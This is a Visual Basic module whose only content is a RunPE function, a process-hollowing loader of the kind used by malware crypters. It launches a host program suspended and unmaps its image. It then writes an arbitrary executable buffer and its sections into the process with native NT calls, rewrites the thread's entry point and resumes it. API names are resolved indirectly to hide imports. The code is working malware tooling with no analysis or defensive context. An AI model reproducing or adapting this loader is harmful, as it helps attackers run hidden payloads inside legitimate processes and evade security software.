Attribute VB_Name = "Module3"
Option Explicit

Public Function RunPE(ByRef bvBuff() As Byte, ByVal sHost As String, Optional ByVal sParams As String, Optional ByRef hProcess As Long) As Long
Dim hModuleBase As Long
Dim hPE As Long
Dim hSec As Long
Dim ImageBase As Long
Dim i As Long
Dim tSTARTUPINFO(16) As Long
Dim tPROCESS_INFORMATION(3) As Long
Dim tCONTEXT(50) As Long
Dim kernel32 As String
Dim NTDLL As String
 
hModuleBase = VarPtr(bvBuff(0))
 
If Not GetNumb(hModuleBase, 2) = &H5A4D Then Exit Function
 
hPE = hModuleBase + GetNumb(hModuleBase + &H3C)
 
If Not GetNumb(hPE) = &H4550 Then Exit Function
 
ImageBase = GetNumb(hPE + &H34)
 
tSTARTUPINFO(0) = &H44
 
Call CallAPI(("KERNEL32"), ("CreateProcessW"), 0, StrPtr(sHost), StrPtr(sParams), 0, 0, &H4, 0, 0, VarPtr(tSTARTUPINFO(0)), VarPtr(tPROCESS_INFORMATION(0)))
 
Call CallAPI(("NTDLL"), ("NtUnmapViewOfSection"), tPROCESS_INFORMATION(0), ImageBase)
 
Call CallAPI(("NTDLL"), ("NtAllocateVirtualMemory"), tPROCESS_INFORMATION(0), VarPtr(ImageBase), 0, VarPtr(GetNumb(hPE + &H50)), &H3000, &H40)
 
Call CallAPI(("NTDLL"), ("NtWriteVirtualMemory"), tPROCESS_INFORMATION(0), ImageBase, VarPtr(bvBuff(0)), GetNumb(hPE + &H54), 0)
 
For i = 0 To GetNumb(hPE + &H6, 2) - 1
hSec = hPE + &HF8 + (&H28 * i)
Call CallAPI(("NTDLL"), ("NtWriteVirtualMemory"), tPROCESS_INFORMATION(0), ImageBase + GetNumb(hSec + &HC), hModuleBase + GetNumb(hSec + &H14), GetNumb(hSec + &H10), 0)
Next i
 
tCONTEXT(0) = &H10007
 
Call CallAPI(("NTDLL"), ("NtGetContextThread"), tPROCESS_INFORMATION(1), VarPtr(tCONTEXT(0)))
 
Call CallAPI(("NTDLL"), ("NtWriteVirtualMemory"), tPROCESS_INFORMATION(0), tCONTEXT(41) + &H8, VarPtr(ImageBase), &H4, 0)
 
tCONTEXT(44) = ImageBase + GetNumb(hPE + &H28)
 
Call CallAPI(("NTDLL"), ("NtSetContextThread"), tPROCESS_INFORMATION(1), VarPtr(tCONTEXT(0)))
 
Call CallAPI(("NTDLL"), ("NtResumeThread"), tPROCESS_INFORMATION(1), 0)
 
hProcess = tPROCESS_INFORMATION(0)
RunPE = 1
End Function
Private Function GetNumb(ByVal lPtr As Long, Optional ByVal lSize As Long = &H4) As Long
Call CallAPI(("NTDLL"), ("NtWriteVirtualMemory"), -1, VarPtr(GetNumb), lPtr, lSize, 0)
End Function




